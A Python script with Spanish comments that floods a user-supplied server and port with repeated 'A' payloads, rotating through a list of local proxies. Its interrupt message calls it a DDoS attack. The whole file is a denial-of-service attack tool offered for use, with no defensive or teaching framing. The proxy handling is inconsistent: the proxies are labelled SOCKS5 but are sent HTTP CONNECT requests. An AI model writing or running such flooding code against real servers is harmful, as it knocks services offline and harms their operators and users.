import socket
import random
import signal
import sys

# Lista de proxys SOCKS5
proxies = [
    ("127.0.0.1", 1080),
    ("127.0.0.1", 1081),
    ("127.0.0.1", 1082),
    ("127.0.0.1", 1083),
    ("127.0.0.1", 1084)
]

# Pedimos al usuario la URL, el puerto y el peso del mensaje
url = input("Introduce la URL del servidor: ")
port = int(input("Introduce el puerto: "))
message_size = int(input("Introduce el tamaño del mensaje en bytes: "))

# Función para manejar la interrupción de teclado
def signal_handler(sig, frame):
    print("\nDeteniendo el ataque DDoS...")
    sys.exit(0)

# Registramos la función para manejar la interrupción de teclado
signal.signal(signal.SIGINT, signal_handler)

while True:
    # Seleccionamos un proxy aleatorio de la lista
    proxy = random.choice(proxies)
    print("Usando proxy:", proxy)

    try:
        # Creamos un socket para el proxy
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(proxy)
        print("Conectado a proxy:", proxy)

        # Enviamos la petición de conexión al servidor
        s.sendall(f"CONNECT {url}:{port} HTTP/1.1\r\n\r\n".encode())

        # Recibimos la respuesta del proxy
        response = s.recv(4096)
        if response.decode().split()[1] != "200":
            print("Error en la conexión:", response.decode())
            continue
        else:
            print("Conexión establecida con éxito")

        # Enviamos el mensaje
        message = b"A" * message_size
        s.sendall(message)

        # Recibimos la respuesta del servidor
        response = s.recv(4096)
        print("Respuesta del servidor:", response.decode())

    except Exception as e:
        print("Error en la conexión:", e)

    finally:
        s.close()
